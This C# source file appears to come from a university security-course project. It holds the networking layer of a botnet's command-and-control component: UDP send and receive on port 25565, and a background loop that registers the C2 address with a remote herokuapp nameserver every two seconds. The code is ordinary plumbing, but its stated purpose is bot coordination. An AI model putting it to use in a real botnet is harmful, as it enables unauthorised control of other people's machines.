using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Coms4507_Project.BotHandling
{
    /// <summary>
    /// This object handles connecting to the nameserver, alongside two functions (listen for message) and (send message).
    /// The BotHandler.cs object will handle the loop of listening, processing and sending. It just uses this object as an API 
    /// for abstracting that process.
    /// </summary>
    internal class NetworkHandler
    {
        private readonly UdpClient udpClient;
        private readonly int portNumber = 25565;
        private IPEndPoint endpoint;
        public string publicIp;
        private NameserverContactHandler nameserverContactor;

        public NetworkHandler(string ip)
        {
            publicIp = ip;
            udpClient = new UdpClient(portNumber);
            // There needs to be a port forward set up to listen for incoming requests.
            endpoint = new IPEndPoint(IPAddress.Parse(GetLocalIPAddress()), portNumber);
            nameserverContactor = new NameserverContactHandler(ip);
        }

        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        public void SendMessage(string message, string addr, string portNum)
        {
            IPEndPoint client = new IPEndPoint(IPAddress.Parse(addr), Convert.ToInt32(portNum));
            byte[] dataB = Encoding.UTF8.GetBytes(message);
            _ = udpClient.Send(dataB, dataB.Length, client);
        }

        public Dictionary<string, string> WaitForMessage()
        {
            byte[] dataB = udpClient.Receive(ref endpoint); // This is blocking.
            string data = Encoding.UTF8.GetString(dataB);
            Dictionary<string, string> dataValue = new Dictionary<string, string>
            {
                { "ip", endpoint.Address.ToString() },
                { "port", endpoint.Port.ToString() },
                { "payload", data }
            };
            return dataValue;
        }

    }


    // =========================== [ NAMESERVER INTERACTIONS ARE DONE HERE ] ===========================

    internal class NameserverContactHandler
    {
        private readonly HttpClient httpClient;
        private string webserverIp = "https://athena-nameserver-v2.herokuapp.com";
        private string ip;
        public NameserverContactHandler(string ip)
        {
            this.ip = ip;
            httpClient = new HttpClient();
            Dictionary<object, object> dict = new Dictionary<object, object>
            {
                { "ip", ip },
                { "port", 25565 }
            };
            JObject firstContact = JObject.FromObject(dict);
            Action<object> action = (object obj) =>
            {
                while(true)
                {
                    Task<HttpResponseMessage> response = httpClient.PostAsync(webserverIp + "/api/lookup/c2/update", 
                        new StringContent(firstContact.ToString()));
                    response.Wait();
                    string botIP = response.Result.Content.ReadAsStringAsync().Result;
                    Trace.WriteLine(botIP);
                    Thread.Sleep(2000);
                }
                
            };
            Task task = new Task(action, "nameserver Updater");
            task.Start();


        }

    }
}
